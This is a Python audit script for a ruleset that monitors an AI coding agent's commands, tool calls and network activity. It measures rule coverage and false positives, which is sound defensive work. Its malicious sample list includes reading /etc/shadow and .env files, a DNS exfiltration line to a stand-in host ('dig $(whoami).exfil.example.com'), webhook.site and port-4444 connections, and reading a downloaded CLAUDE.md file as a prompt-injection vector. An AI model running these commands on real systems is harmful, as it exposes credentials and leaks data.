#!/usr/bin/env python3
"""Ruleset audit: structural checks, dead-rule detection, coverage and FP rate.

    python3 tests/audit_rules.py

Answers four questions the unit tests do not:
  1. Can every rule ever fire, given its targets and scan scope?
  2. Is every rule exercised by at least one detection case?
  3. Which rules fire on a corpus of ordinary development commands?
  4. Are any patterns structurally suspect (unanchored short tokens, etc.)?
"""

import json
import os
import re
import sys
from collections import defaultdict

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from monitor.rules import Engine, SEVERITY_ORDER, validate_spec  # noqa: E402

# Which (target, scan) combinations produce a non-empty haystack.
HAYSTACK = {
    ("tool_use", "command"): True, ("tool_use", "content"): True,
    ("tool_result", "command"): False, ("tool_result", "content"): True,
    ("proc", "command"): True, ("proc", "content"): False,
    ("net", "command"): True, ("net", "content"): False,
}

# Ordinary development work. Nothing here should be a finding above 'low'
# unless the rule genuinely wants you to see it every time.
BENIGN = [
    ("proc", "git status"),
    ("proc", "git commit -m 'fix parser'"),
    ("proc", "git pull --rebase origin main"),
    ("proc", "npm install"),
    ("proc", "npm run build"),
    ("proc", "npm test -- --coverage"),
    ("proc", "pip install -r requirements.txt"),
    ("proc", "cargo build --release"),
    ("proc", "go test ./..."),
    ("proc", "make -j8"),
    ("proc", "docker compose up -d"),
    ("proc", "docker build -t app:latest ."),
    ("proc", "kubectl get pods -n staging"),
    ("proc", "terraform plan"),
    ("proc", "ls -la src/components"),
    ("proc", "find . -name '*.test.ts' -maxdepth 3"),
    ("proc", "grep -rn 'TODO' src/"),
    ("proc", "rg --files-with-matches useState src"),
    ("proc", "cat package.json"),
    ("proc", "python3 manage.py migrate"),
    ("proc", "node scripts/seed.js"),
    ("proc", "pytest -x tests/"),
    ("proc", "tsc --noEmit"),
    ("proc", "eslint . --fix"),
    ("proc", "brew list --versions"),
    ("proc", "du -sh node_modules"),
    ("proc", "ps aux | head -20"),
    ("proc", "tail -f logs/app.log"),
    ("proc", "curl -s https://api.github.com/repos/x/y | jq .stargazers_count"),
    ("proc", "curl -fsSL https://registry.npmjs.org/react | head -c 200"),
    ("proc", "mkdir -p build && cd build"),
    ("proc", "cp config.example.json config.json"),
    ("proc", "mv dist/ release/"),
    ("proc", "chmod +x scripts/deploy.sh"),
    ("proc", "echo 'VERSION=1.2.3' > .version"),
    ("proc", "sed -i '' 's/foo/bar/g' src/app.js"),
    ("proc", "tar -czf backup.tgz src/"),
    ("proc", "openssl rand -hex 16"),
    ("proc", "sqlite3 db.sqlite '.tables'"),
    ("proc", "psql -c 'SELECT count(*) FROM users'"),
    ("tool_use", {"tool": "Write", "summary": "/proj/src/app.py",
                  "input": '{"file_path":"/proj/src/app.py","content":"import os\\ndef main():\\n    pass"}',
                  "cwd": "/proj"}),
    ("tool_use", {"tool": "Edit", "summary": "/proj/README.md",
                  "input": '{"file_path":"/proj/README.md","new_string":"## Setup\\nrun npm install"}',
                  "cwd": "/proj"}),
    ("tool_use", {"tool": "Bash", "summary": "git diff --stat",
                  "input": '{"command":"git diff --stat"}', "cwd": "/proj"}),
    ("tool_result", {"text": "PASS  src/app.test.ts (12 tests)\nAll tests passed."}),
    ("tool_result", {"text": "total 24\ndrwxr-xr-x  5 user  staff  160 Jan  1 00:00 src"}),

    # Harder cases: ordinary work that superficially resembles an attack.
    # Anything firing here at high/critical is a false positive worth fixing.
    ("proc", "brew install ngrok"),
    ("proc", "npm install --save-dev ngrok"),
    ("proc", "git push --force-with-lease origin feature"),
    ("proc", "curl -X POST http://localhost:3000/api/test -d '{}'"),
    ("proc", "curl -X POST https://api.stripe.com/v1/charges -u sk_test:"),
    ("proc", "docker run --rm -v $(pwd):/app node:20 npm test"),
    ("proc", "ssh-keygen -t ed25519 -C 'ci@example.com'"),
    ("proc", "aws s3 ls s3://my-bucket/"),
    ("proc", "grep -c 'error' logs/app.log"),
    ("proc", "python3 -c 'import sys; print(sys.version)'"),
    ("proc", "nc -z localhost 8080"),
    ("proc", "tar -xzf release.tgz -C /tmp/staging"),
    ("proc", "echo $PATH"),
    ("proc", "kubectl exec -it pod -- sh"),
    ("proc", "rsync -av ./dist/ ./backup/"),
    ("proc", "openssl s_client -connect example.com:443 -servername example.com"),
    ("proc", "systemctl status nginx"),
    ("proc", "launchctl print gui/501 | head"),
    ("proc", "defaults read com.apple.finder"),
    ("proc", "security find-certificate -a -p"),
    ("proc", "npx serve -l 5000 dist"),
    ("proc", "java -jar build/libs/app.jar"),
    ("proc", "./gradlew assembleDebug"),
    ("proc", "pod install"),
    ("proc", "vercel deploy --prod"),
]

# Commands that SHOULD fire — they are legitimate but genuinely worth seeing.
# Listed so the audit does not report them as false positives.
EXPECTED_ON_BENIGN = {
    "rm -rf node_modules": "DESTR-001",
    "sudo make install": "PRIVESC-001",
}

# One malicious sample per rule that has no unit-test case, so coverage is real.
EXTRA_MALICIOUS = {
    "CRED-003": ("proc", "cat /Users/x/app/.env"),
    "CRED-006": ("proc", "sudo cat /etc/shadow"),
    "EXFIL-005": ("proc", "dig $(whoami).exfil.example.com"),
    "DESTR-004": ("proc", "psql -c 'DROP TABLE users'"),
    "DESTR-005": ("proc", "rm -f /tmp/scratch.txt"),
    "PERSIST-003": ("proc", "crontab -e"),
    "PRIVESC-002": ("proc", "chmod 777 /usr/local/bin/app"),
    "LATERAL-002": ("proc", "ssh root@10.0.0.5"),
    "RECON-001": ("proc", "whoami"),
    "SCOPE-001": ("tool_use", {"tool": "Write", "summary": "/etc/hosts",
                               "input": '{"file_path":"/etc/hosts","content":"x"}',
                               "cwd": "/proj"}),
    "SCOPE-002": ("proc", "cp payload /usr/local/bin/app"),
    "INJECT-002": ("tool_use", {"tool": "Read", "summary": "/tmp/dl/CLAUDE.md",
                                "input": '{"file_path":"/tmp/dl/CLAUDE.md"}', "cwd": "/proj"}),
    "NET-001": ("net", {"change": "open", "remoteHost": "203.0.113.9",
                        "remoteName": "unknown.example", "remotePort": "443"}),
    "NET-002": ("net", {"change": "open", "remoteHost": "203.0.113.9", "remotePort": "4444"}),
    "EXFIL-002": ("net", {"change": "open", "remoteHost": "203.0.113.9",
                          "remoteName": "webhook.site", "remotePort": "443"}),
}


def mk(kind, sample):
    if isinstance(sample, dict):
        return dict(sample, sessionId="audit")
    if kind == "proc":
        return {"cmd": sample, "sessionId": "audit"}
    if kind == "net":
        return dict(sample, sessionId="audit")
    return {"tool": "Bash", "summary": sample,
            "input": json.dumps({"command": sample}), "cwd": "/proj", "sessionId": "audit"}


def main():
    eng = Engine(None, dedupe_window_s=0)
    rules = eng.rules
    problems = defaultdict(list)

    print(f"claudemon ruleset audit — {len(rules)} rules\n")

    # 1. structural validation
    print("1. STRUCTURE " + "-" * 52)
    errors = validate_spec(json.loads(json.dumps(
        {"rules": [{k: v for k, v in r.items() if not k.startswith("_")} for r in rules]})))
    print(f"   schema errors: {len(errors)}")
    for e in errors:
        print("   !", e)
        problems["structure"].append(e)

    # 2. dead rules — a target/scan pairing whose haystack is always empty
    print("\n2. DEAD RULES " + "-" * 51)
    dead = []
    for r in rules:
        if any(r.get(k) for k in ("scopeCheck", "egressCheck", "portCheck", "listenOnly")):
            continue
        scan = r.get("scan", "command")
        scopes = ("command", "content") if scan == "both" else (scan,)
        live = [t for t in r.get("targets", [])
                if any(HAYSTACK.get((t, s)) for s in scopes)]
        if not live:
            dead.append((r["id"], r.get("targets"), scan))
        else:
            unreachable = [t for t in r.get("targets", []) if t not in live]
            if unreachable:
                problems["unreachable-target"].append(
                    f"{r['id']}: scan={scan} can never match on target(s) {unreachable}")
    for rid, targets, scan in dead:
        print(f"   ! {rid}: targets={targets} scan={scan} — can never fire")
        problems["dead"].append(rid)
    for p in problems["unreachable-target"]:
        print("   ~", p)
    if not dead and not problems["unreachable-target"]:
        print("   none")

    # 3. detection coverage
    print("\n3. COVERAGE " + "-" * 53)
    fired = defaultdict(list)
    for rid, (kind, sample) in EXTRA_MALICIOUS.items():
        for f in eng.evaluate(kind, mk(kind, sample)):
            fired[f["ruleId"]].append(rid)
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    try:
        from test_rules import MALICIOUS
        for label, kind, ev, expect in MALICIOUS:
            ev = dict(ev, sessionId="audit")
            for f in eng.evaluate(kind, ev):
                fired[f["ruleId"]].append(label)
    except Exception as exc:
        print("   (could not import test_rules:", exc, ")")

    special = {r["id"] for r in rules
               if any(r.get(k) for k in ("scopeCheck", "egressCheck", "portCheck", "listenOnly"))}
    uncovered = [r["id"] for r in rules if r["id"] not in fired]
    ids = {r["id"] for r in rules}
    chain = sorted(k for k in fired if k not in ids)
    print(f"   rules with a proven detection: {len(set(fired) & ids)}/{len(rules)}"
          + (f"   (+ correlation rules {', '.join(chain)})" if chain else ""))
    for rid in uncovered:
        note = " (built-in check)" if rid in special else ""
        print(f"   ! no sample fires {rid}{note}")
        problems["uncovered"].append(rid)
    if not uncovered:
        print("   every rule has at least one proven detection")

    # 4. false positives against ordinary work
    print("\n4. FALSE POSITIVES ON ORDINARY DEV WORK " + "-" * 25)
    fps = defaultdict(list)
    for kind, sample in BENIGN:
        ev = mk(kind, sample)
        label = sample if isinstance(sample, str) else (
            ev.get("summary") or ev.get("text", ""))[:60]
        for f in eng.evaluate(kind, ev):
            fps[f["ruleId"]].append((f["severity"], label))
    if not fps:
        print("   no rule fired on the benign corpus")
    for rid, hits in sorted(fps.items(),
                            key=lambda kv: -SEVERITY_ORDER.get(kv[1][0][0], 0)):
        sev = hits[0][0]
        mark = "!" if SEVERITY_ORDER.get(sev, 0) >= 3 else "~"
        print(f"   {mark} {rid} [{sev}] fired on {len(hits)}: "
              + "; ".join(h[1][:44] for h in hits[:3]))
        problems["fp" if SEVERITY_ORDER.get(sev, 0) >= 3 else "fp-low"].append(
            f"{rid} [{sev}] on {[h[1][:40] for h in hits]}")

    # 5. pattern smells
    print("\n5. PATTERN SMELLS " + "-" * 47)
    smells = []
    for r in rules:
        for p in r.get("match", []):
            bare = re.sub(r"\\[bBsSdDwW]|[\\^$()\[\]{}?*+|.]", "", p)
            if len(bare) <= 3 and bare.isalpha():
                smells.append(f"{r['id']}: very short literal {p!r} — collides easily")
            if p.startswith("(") is False and re.match(r"^[a-z]{2,6}$", p or ""):
                smells.append(f"{r['id']}: unanchored bare word {p!r}")
            if "[^\\n]*" in p and any(f in p for f in ("-T", "-F", "-e")) \
                    and not r.get("caseSensitive"):
                smells.append(f"{r['id']}: case-insensitive short flag in {p!r} "
                              "— may match a lowercase flag of another command")
    for s in smells:
        print("   ~", s)
        problems["smell"].append(s)
    if not smells:
        print("   none")

    # 6. metadata consistency
    print("\n6. METADATA " + "-" * 53)
    meta = []
    for r in rules:
        if not r.get("mitre"):
            meta.append(f"{r['id']}: no ATT&CK technique")
        elif not re.match(r"^T\d{4}(\.\d{3})?$", r["mitre"]):
            meta.append(f"{r['id']}: malformed ATT&CK id {r['mitre']!r}")
        for fld in ("rationale", "check"):
            if not (r.get(fld) or "").strip():
                meta.append(f"{r['id']}: empty '{fld}' — finding would not be actionable")
    for m in meta:
        print("   ~", m)
        problems["meta"].append(m)
    if not meta:
        print("   every rule has an ATT&CK id, a rationale and a check")

    # summary
    print("\n" + "=" * 64)
    hard = len(problems["structure"]) + len(problems["dead"]) + len(problems["fp"])
    soft = (len(problems["uncovered"]) + len(problems["fp-low"]) + len(problems["smell"])
            + len(problems["meta"]) + len(problems["unreachable-target"]))
    print(f"blocking issues: {hard}    advisories: {soft}")
    by_sev = defaultdict(int)
    by_cat = defaultdict(int)
    for r in rules:
        by_sev[r.get("severity")] += 1
        by_cat[r.get("category")] += 1
    print("severity mix:", dict(sorted(by_sev.items(),
                                       key=lambda kv: -SEVERITY_ORDER.get(kv[0], 0))))
    print("categories:  ", len(by_cat))
    return 1 if hard else 0


if __name__ == "__main__":
    sys.exit(main())
